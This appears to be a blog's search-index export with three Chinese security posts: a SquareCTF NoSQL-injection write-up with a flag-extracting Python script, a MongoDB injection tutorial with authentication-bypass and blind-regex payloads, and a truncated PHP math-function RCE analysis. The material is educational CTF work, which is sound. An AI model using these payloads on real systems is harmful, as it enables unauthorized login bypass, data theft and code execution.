<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2020 SquareCTF Web 复现记录</title>
    <url>/archives/5856e475.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>2020 年 11 月 13 日由 Square 举办的一场比赛，因为与上海大学生赛冲突了并没有打。看推说有 NoSQL 注入，正好前不久就写了关于 NoSQL 的文章<a href="https://landvsec.top/archives/15015253.html">《MongoDB 注入初识》</a> ，想借此来巩固知识。</p>
<a id="more"></a>
<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><h2 id="Deep-Web-Blog"><a href="#Deep-Web-Blog" class="headerlink" title="Deep Web Blog"></a>Deep Web Blog</h2><blockquote>
<p>A secret informant has tipped us off that hackers on the deep web have been plotting an attack on Square to steal our treasured Bitcoins…</p>
</blockquote>
<p>打开是一个博客界面，唯一的功能只有搜索，但搜索功能并没有模糊匹配（且对大小写敏感），whatever，抓包我发现了 posts api 接口，并且可以 get 传参 title 精确匹配到文档：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># request get </span><br><span class="line">http:&#x2F;&#x2F;challenges.2020.squarectf.com:9542&#x2F;api&#x2F;posts</span><br><span class="line"># response</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;_id&quot;: &quot;5faff099307b240008a4365a&quot;,</span><br><span class="line">        &quot;title&quot;: &quot;Blockchain for dummies&quot;,</span><br><span class="line">        &quot;content&quot;: &quot;...&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;_id&quot;: &quot;5faff099307b240008a4365b&quot;,</span><br><span class="line">        &quot;title&quot;: &quot;How to get free bitcoins&quot;,</span><br><span class="line">        &quot;content&quot;: &quot;...&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;_id&quot;: &quot;5faff099307b240008a4365c&quot;,</span><br><span class="line">        &quot;title&quot;: &quot;My Favorite Tool: cipsum.com&quot;,</span><br><span class="line">        &quot;content&quot;: &quot;...&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;_id&quot;: &quot;5faff099307b240008a4365d&quot;,</span><br><span class="line">        &quot;title&quot;: &quot;manifesto&quot;,</span><br><span class="line">        &quot;content&quot;: &quot;...&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;_id&quot;: &quot;5faff099307b240008a4365e&quot;,</span><br><span class="line">        &quot;title&quot;: &quot;test&quot;,</span><br><span class="line">        &quot;content&quot;: &quot;It works!&quot;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># test 1</span><br><span class="line"># request get</span><br><span class="line">http:&#x2F;&#x2F;challenges.2020.squarectf.com:9542&#x2F;api&#x2F;posts?title&#x3D;test</span><br><span class="line"># response</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;_id&quot;: &quot;5faff099307b240008a4365e&quot;,</span><br><span class="line">        &quot;title&quot;: &quot;test&quot;,</span><br><span class="line">        &quot;content&quot;: &quot;It works!&quot;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>值得我们注意的是 <code>_id</code> 这个字段：</p>
<p>MongoDB 存储在集合中的每个文档都需要一个唯一的 <code>_id</code> 字段作为主键。如果插入的文档省略了该 <code>_id</code> 字段，则MongoDB驱动程序会自动为该字段生成一个 <code>ObjectId_id</code> 。</p>
<p>好吧，已经明示了是 NoSQL 注入了，接下来我们要考虑怎么 getflag 。</p>
<p>先用 <code>$ne</code> 进行测试（实际上这里只能回显前 5 条文档）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># test 2</span><br><span class="line"># request get</span><br><span class="line">http:&#x2F;&#x2F;challenges.2020.squarectf.com:9542&#x2F;api&#x2F;posts?title[$ne]&#x3D;test</span><br><span class="line"># response</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;_id&quot;: &quot;5faff099307b240008a4365a&quot;,</span><br><span class="line">        &quot;title&quot;: &quot;Blockchain for dummies&quot;,</span><br><span class="line">        &quot;content&quot;: &quot;...&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;_id&quot;: &quot;5faff099307b240008a4365b&quot;,</span><br><span class="line">        &quot;title&quot;: &quot;How to get free bitcoins&quot;,</span><br><span class="line">        &quot;content&quot;: &quot;...&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;_id&quot;: &quot;5faff099307b240008a4365c&quot;,</span><br><span class="line">        &quot;title&quot;: &quot;My Favorite Tool: cipsum.com&quot;,</span><br><span class="line">        &quot;content&quot;: &quot;...&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;_id&quot;: &quot;5faff099307b240008a4365d&quot;,</span><br><span class="line">        &quot;title&quot;: &quot;manifesto&quot;,</span><br><span class="line">        &quot;content&quot;: &quot;...&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;_id&quot;: &quot;5faff099307b240008a4365f&quot;,</span><br><span class="line">        &quot;title&quot;: &quot;flag&quot;,</span><br><span class="line">        &quot;content&quot;: &quot;Looking for a flag? You won&#39;t find it here. Maybe this can help: https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v&#x3D;Jbix9y8iV38&quot;,</span><br><span class="line">        &quot;flag&quot;: &quot;[REDACTED] Flag format detected - redacted by WAF&quot;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>查询结果有有关 flag 的一条文档记录，提示有 WAF 。</p>
<p>实际上，在之前的测试中，如果没有精确匹配到相关文档是会返回空列表的：</p>
<p><img src="https://i.loli.net/2020/11/15/f5MGiabenx9IoXT.png" style="zoom:80%;" /></p>
<p>既然只有两种不同回显，我自然而然想到了利用 <code>$regex</code> 来盲注，这里我们通过 <code>$regex</code> 匹配 flag 文档的 flag 字段：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># test 3</span><br><span class="line"># request get</span><br><span class="line">http:&#x2F;&#x2F;challenges.2020.squarectf.com:9542&#x2F;api&#x2F;posts?flag[$regex]&#x3D;flag&#123;.*&#125;</span><br><span class="line"># response</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;_id&quot;: &quot;5faff099307b240008a4365f&quot;,</span><br><span class="line">        &quot;title&quot;: &quot;flag&quot;,</span><br><span class="line">        &quot;content&quot;: &quot;Looking for a flag? You won&#39;t find it here. Maybe this can help: https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v&#x3D;Jbix9y8iV38&quot;,</span><br><span class="line">        &quot;flag&quot;: &quot;[REDACTED] Flag format detected - redacted by WAF&quot;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># test 4</span><br><span class="line"># request get</span><br><span class="line">http:&#x2F;&#x2F;challenges.2020.squarectf.com:9542&#x2F;api&#x2F;posts?flag[$regex]&#x3D;flag&#123;a.*&#125;</span><br><span class="line"># response</span><br><span class="line">[]</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"># test 5</span><br><span class="line"># request get</span><br><span class="line">http:&#x2F;&#x2F;challenges.2020.squarectf.com:9542&#x2F;api&#x2F;posts?flag[$regex]&#x3D;flag&#123;n.*&#125;</span><br><span class="line"># response</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;_id&quot;: &quot;5faff099307b240008a4365f&quot;,</span><br><span class="line">        &quot;title&quot;: &quot;flag&quot;,</span><br><span class="line">        &quot;content&quot;: &quot;Looking for a flag? You won&#39;t find it here. Maybe this can help: https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v&#x3D;Jbix9y8iV38&quot;,</span><br><span class="line">        &quot;flag&quot;: &quot;[REDACTED] Flag format detected - redacted by WAF&quot;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>根据上面测试的结果可以写出对应 Python 脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">dic = string.ascii_letters + string.digits + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        url = <span class="string">&quot;http://challenges.2020.squarectf.com:9542/api/posts?flag[$regex]=&#123;&#125;&#123;&#125;.*&quot;</span>.<span class="built_in">format</span>(flag, j)</span><br><span class="line">        response = requests.request(<span class="string">&quot;GET&quot;</span>, url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(<span class="string">&quot;[i] the result is: &quot;</span> + flag)</span><br><span class="line">            <span class="keyword">if</span> flag[:<span class="number">-1</span>]==<span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/11/15/LQYndBlVOyWxC7M.png" style="zoom:80%;" /></p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>MongoDB 注入初识</title>
    <url>/archives/15015253.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>写此篇缘由 2020 CSR 的 Secure Secret Sharing 这道 MongoDB 注入题，发现其注入方式完全不同于 MySQL、SQLite 等数据库，同时国内关于 MongoDB 注入的文章很少，且发表于 2012~2016 很早的时间段，所以想结合外网的文章进行翻译拓展，由于参考文章非常多，就不详细列出了，一些也需要科学上网才能访问。</p>
<p>总之，希望这篇文章能帮助到你。</p>
<a id="more"></a>
<h1 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h1><p>MongoDB 安装可以参考这篇<a href="https://blog.csdn.net/weixin_41466575/article/details/105326230">博客</a> ，当然你要是有 docker 则更为方便。</p>
<p>基础语法的学习建议先去看看 <a href="https://docs.mongoing.com/mongo-introduction">MongoDB 官方中文手册</a> ，本篇并不作介绍。</p>
<h2 id="注入简介"><a href="#注入简介" class="headerlink" title="注入简介"></a>注入简介</h2><p>MongoDB 是 NoSQL 的一个开源数据库，它的“数据”是一个文档，由字段和值对组成的数据结构，类似于JSON对象。字段的值可以包括其他文档，数组和文档数组。而它的“表”则称为集合。</p>
<p>我们知道 SQL 注入是允许攻击者在数据库中执行命令。但与关系数据库不同，NoSQL 数据库<strong>不使用通用查询语言</strong>。NoSQL 查询语法是用应用程序的编程语言编写的 : PHP、 JavaScript、 Python、 Java 等等，这也意味着成功的注入使攻击者不仅可以在数据库中执行命令，而且还可以在应用程序本身中执行命令，变得更加危险。</p>
<p>而 MongoDB 使用二进制 JSON (BSON) 数据格式，并附带一个安全的 BSON 查询汇编工具。查询也表示为 BSON 对象 (即二进制数据) ，因此<strong>不可能进行直接字符串注入</strong>，如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">db.users.find(&#123;username: username, password: password&#125;);</span><br></pre></td></tr></table></figure>
<p>以这种形式来查询用户登录信息的语句。</p>
<p>但我们看下面的例子：</p>
<h3 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h3><p>假设用户名字段或参数来自反序列化的 JSON 对象。</p>
<p>源码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.post(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        db.users.find(&#123;<span class="attr">username</span>: req.body.username, <span class="attr">password</span>: req.body.password&#125;, <span class="function"><span class="keyword">function</span> (<span class="params">err, users</span>) </span>&#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> handle the rest</span></span><br><span class="line">        &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>在上面的 ExpressJS 程序中，没有验证用户名和密码字段以确保它们是字符串。因此，当对 JSON 文档进行反序列化时，这些字段可能包含除字符串以外的任何字符串，而这些字符串可用于操作查询的结构。</p>
<p>如果一个人提供这样一个 JSON 文档作为应用程序的输入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;username&quot;: &#123;&quot;$gt&quot;: &quot;&quot;&#125;,</span><br><span class="line">    &quot;password&quot;: &#123;&quot;$gt&quot;: &quot;&quot;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们知道 <code>$gt</code> 是大于运算符，那么数据库将把用户名和密码与 “” 进行比较，大于空，不就是<strong>恒真</strong>吗？</p>
<p>更为明显的示例：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">queryObject = &#123;<span class="attr">amount</span>:<span class="number">0</span>&#125;; <span class="comment">//items with fixed value ‘amount’ is 0</span></span><br><span class="line"><span class="comment">// inject $gt:0</span></span><br><span class="line">queryObject = &#123;<span class="attr">amount</span>: &#123;<span class="attr">$gt</span>:<span class="number">0</span>&#125;&#125;; <span class="comment">//items with field amount &gt;0</span></span><br></pre></td></tr></table></figure>
<p>如上，我们将获得所有 amout 大于 0 的文档。</p>
<h3 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h3><p>上面将 JSON 作为通信机制的例子并不少见，但更为广泛运用的是 url 编码的键值对，但用这个格式就安全了吗？</p>
<p>遗憾的是，下面的输入可以与上面达到一样的效果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username[$gt]&#x3D;&amp;password[$gt]&#x3D;</span><br></pre></td></tr></table></figure>
<p>字符串用户名 <code>[$gt]=</code> 是 qs 模块使用的一种特殊语法 (ExpressJS 和 body-parser 中间件中的默认语法)。这种语法相当于使用一个名为 <code>$gt</code> 的参数创建一个 JavaScript 对象/散列，该参数被映射为 no value 。从本质上讲，上面的请求会产生一个 JavaScript 对象，如下面所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;username&quot;: &#123;&quot;$gt&quot;: undefined&#125;,</span><br><span class="line">    &quot;password&quot;: &#123;&quot;$gt&quot;: undefined&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="注入详解"><a href="#注入详解" class="headerlink" title="注入详解"></a>注入详解</h2><h3 id="Payload-构造"><a href="#Payload-构造" class="headerlink" title="Payload 构造"></a>Payload 构造</h3><p>在上面的讲述中我们用到了 <code>$gt</code> 这个运算符构造恒真，而 MongoDB 还有其他很多运算符可供使用，我们通过这些结合示例来学习如何构造 payload ：</p>
<blockquote>
<p><code>$ne</code> — 匹配所有不等于指定值的值。</p>
<p><code>$gt</code> — 匹配大于指定值的值。</p>
<p><code>$exists</code> — 匹配具有指定字段的文档。</p>
<p>以上三种在 bypass 身份验证时常用。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#in URL</span><br><span class="line">username[$ne]&#x3D;xx&amp;password[$ne]&#x3D;xx</span><br><span class="line">username[$exists]&#x3D;true&amp;password[$exists]&#x3D;true</span><br><span class="line"></span><br><span class="line">#in JSON</span><br><span class="line">&#123;&quot;username&quot;: &#123;&quot;$ne&quot;: null&#125;, &quot;password&quot;: &#123;&quot;$ne&quot;: null&#125; &#125;</span><br><span class="line">&#123;&quot;username&quot;: &#123;&quot;$ne&quot;: &quot;foo&quot;&#125;, &quot;password&quot;: &#123;&quot;$ne&quot;: &quot;bar&quot;&#125; &#125;</span><br><span class="line">&#123;&quot;username&quot;: &#123;&quot;$gt&quot;: undefined&#125;, &quot;password&quot;: &#123;&quot;$gt&quot;: undefined&#125; &#125;</span><br></pre></td></tr></table></figure>
<p><code>$regex</code> — 选择值与指定的正则表达式匹配的文档。</p>
<p>通常用于盲注。</p>
<p>基于 <code>$regex</code> 的盲注，如果可以科学上网的强烈建议看一下<a href="https://medium.com/rangeforce/meteor-blind-nosql-injection-29211775cd01">这篇文章</a></p>
<p>Python 脚本相信懂了下面示例的你一定能写出来:-)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username[$regex]&#x3D;^adm$password[$ne]&#x3D;1 </span><br><span class="line">#Check a &lt;regular expression&gt;, could be used to brute-force a parameter</span><br><span class="line">username[$regex]&#x3D;.&#123;25&#125;&amp;pass[$ne]&#x3D;1 </span><br><span class="line">#Use the &lt;regex&gt; to find the length of a value</span><br></pre></td></tr></table></figure>
<p><code>$nin</code> — 不匹配数组中指定的任何值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username[$nin][admin]&#x3D;admin&amp;username[$nin][test]&#x3D;test&amp;pass[$ne]&#x3D;7 </span><br><span class="line">#&lt;Matches non of the values of the array&gt; (not test and not admin)</span><br></pre></td></tr></table></figure>
<p><code>$where</code> — 匹配满足JavaScript表达式的文档。</p>
<p>被允许运行 JavaScript 的还有 <code>mapReduce</code>、<code>group</code> :</p>
<p><img src="https://i.loli.net/2020/11/10/FdDJpWCmQqOs2jB.png"  /></p>
<p>文档非常清楚，如果使用了这个功能，开发者应该注意防止用户提交恶意的 JavaScript 。换句话说，MongoDB 特意包含了一个潜在的注入向量。</p>
<p>例如，使用 <code>$where</code> 查询通常会用到 <code>find()</code> 函数：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">db.collection.find( &#123; <span class="attr">$where</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line"> <span class="keyword">return</span> (<span class="built_in">this</span>.name == $userData) &#125; &#125; );</span><br><span class="line"><span class="comment">//inject &#x27;a&#x27;;sleep(5000)</span></span><br><span class="line">db.collection.find( &#123; <span class="attr">$where</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line"> <span class="keyword">return</span> (<span class="built_in">this</span>.name == <span class="string">&#x27;a&#x27;</span>; sleep(<span class="number">5000</span>) ) &#125; &#125; );</span><br></pre></td></tr></table></figure>
<p>如果上面注入成功，服务器将会停顿 5 s 。</p>
</blockquote>
<p>更多 payload 的学习，可以参考一下这个<a href="https://github.com/cr0hn/nosqlinjection_wordlists/blob/master/mongodb_nosqli.txt">文档</a></p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>NoSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP利用Math函数RCE总结</title>
    <url>/archives/e11628b6.html</url>
    <content><![CDATA[<div class="note info">
            <p>本文由<strong>landvsec</strong>原创发布<br>转载，请参考<a href="https://www.anquanke.com/note/repost">转载声明</a>，注明出处： <a href="https://www.anquanke.com/post/id/220813">https://www.anquanke.com/post/id/220813</a><br>安全客 - 有思想的安全新媒体</p>
          </div>
<a id="more"></a>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>安全客投稿成功的第一篇文章，面向基础。</p>
<p>由 2019 国赛 love math 而来，国赛题目质量一直可以的，“数学题”近年来也不少，比如今年护网杯，但网上一些博客写得不够基础，比如 php 异或的原理是什么？为什么两个字符串异或会得到这个？完全没有解答。</p>
<p>写这篇文章的目的，就是从基础层面上，收集师傅们的各种解题方法来总的分析一下—— php 怎么利用数学函数来代码执行。</p>
<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><h2 id="Love-Math"><a href="#Love-Math" class="headerlink" title="Love Math"></a>Love Math</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//ban 了单双反引号，不能直接利用 eval 命令执行</span></span><br><span class="line">    $blacklist = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/m&#x27;</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.$content.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>get 传参 c ，长度限制 80 ，有黑白名单，简而言之，要求你构造一个用白名单函数，又不包括黑名单符号的 payload 来命令执行。</p>
<p>白名单中数学函数分两种利用方法，进制转换和异或，旨在调用<strong>能返回字符串</strong>的数学函数达到命令执行的目的。</p>
<hr>
<h3 id="数学函数的利用"><a href="#数学函数的利用" class="headerlink" title="数学函数的利用"></a>数学函数的利用</h3><h4 id="进制转换函数"><a href="#进制转换函数" class="headerlink" title="进制转换函数"></a>进制转换函数</h4><p>这里参考了 <a href="https://northity.com/2019/04/23/CISCN2019Web-WP/#love-math">N0rths 一血师傅的博客</a></p>
<p>白名单里进制转换的函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;base_convert&#39;, &#39;bindec&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;hexdec&#39;, &#39;decoct&#39;,&#39;octdec&#39;</span><br></pre></td></tr></table></figure>
<p>函数解释：</p>
<blockquote>
<p><code>base_convert(number,frombase,tobase)</code></p>
<p>在任意进制之间转换数字。</p>
<p><code>dechex(dec_number)</code></p>
<p>把十进制转换为十六进制。返回一个字符串，包含有给定 <em>binary_string</em> 参数的十六进制表示。所能转换的最大数值为十进制的 4294967295，其结果为 “ffffffff”。</p>
<p><code>hexdec(hex_string)</code></p>
<p>把十六进制转换为十进制。返回与 <em>hex_string</em> 参数所表示的十六进制数等值的的十进制数。</p>
<p>其他的 <code>decbin</code> <code>decbin</code> <code>decoct</code> <code>octdec</code> 同上，分别是二进制、八进制与十进制的互转。</p>
</blockquote>
<p>十六进制的字母范围只有 a-f ，显然是不符合我们构造的要求，而三十六进制字母范围正好为 a-z 。</p>
<p>而 <code>base_convert</code> 正好能在任意进制转换数字，这样我们传入十进制的数字，使其转换为三十六进制时，返回的字符串是我们想要的 <code>cat</code> 等命令就行了。</p>
<p>反过来构造，例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> base_convert(<span class="string">&quot;cat&quot;</span>,<span class="number">36</span>,<span class="number">10</span>);</span><br><span class="line"><span class="comment">//15941</span></span><br></pre></td></tr></table></figure>
<p>但这里，虽然可以构造纯字母字符串了，但进制转换显然不能返回 <code>.</code> <code>/</code> <code>*</code> 等特殊字符，而这就需要用到另一类运算函数。</p>
<h4 id="运算函数"><a href="#运算函数" class="headerlink" title="运算函数"></a>运算函数</h4><p>比如我们要构造 <code>system(&#39;cat *&#39;)</code></p>
<p>那么我们需要返回 <code>空格*</code> 这样的函数，而 php 中函数名默认为字符串，可以进行异或。</p>
<blockquote>
<p><a href="https://www.php.net/manual/zh/language.operators.bitwise.php">php 异或</a></p>
<p>php 中异或运算符 <code>^</code> 是位运算符，如果进行运算的都是数字的话：</p>
<p><img src="https://i.loli.net/2020/11/08/CjkqAViyOM7nEz4.png" alt=""></p>
<p>将会先转换为二进制来按位异或，比如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="number">12</span> ^ <span class="number">9</span>; <span class="comment">// Outputs &#x27;5&#x27;</span></span><br></pre></td></tr></table></figure>
<p>但如果进行运算的有字符串呢？</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;12&quot;</span> ^ <span class="string">&quot;9&quot;</span>; <span class="comment">// Outputs the Backspace character (ascii 8)</span></span><br><span class="line">              <span class="comment">// (&#x27;1&#x27; (ascii 49)) ^ (&#x27;9&#x27; (ascii 57)) = #8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hallo&quot;</span> ^ <span class="string">&quot;hello&quot;</span>; <span class="comment">// Outputs the ascii values #0 #4 #0 #0 #0</span></span><br><span class="line">                     <span class="comment">// &#x27;a&#x27; ^ &#x27;e&#x27; = #4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="number">2</span> ^ <span class="string">&quot;3&quot;</span>; <span class="comment">// Outputs 1</span></span><br><span class="line">           <span class="comment">// 2 ^ ((int)&quot;3&quot;) == 1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;2&quot;</span> ^ <span class="number">3</span>; <span class="comment">// Outputs 1</span></span><br><span class="line">           <span class="comment">// ((int)&quot;2&quot;) ^ 3 == 1</span></span><br></pre></td></tr></table></figure>
<p>长度一致时，会先把字符串按位转换为 ascii 码，再将 ascii 码转换为二进制进行按位异或，最后输出 ascii 为异或结果的字符。</p>
<p>长度不一致时，按最短的字符串长度按位异或，比如 <code>&quot;12&quot; ^ &quot;9&quot;</code> 的例子。</p>
<p>按位异或运算的几个性质：</p>
<ol>
<li><p>结合律 </p>
<p>a ^ b ^ c = a ^ c ^ b</p>
</li>
<li><p>交换律 </p>
<p>a ^ b = b ^ a</p>
</li>
<li><p>数值交换（能交换 a 与 b 的值）</p>
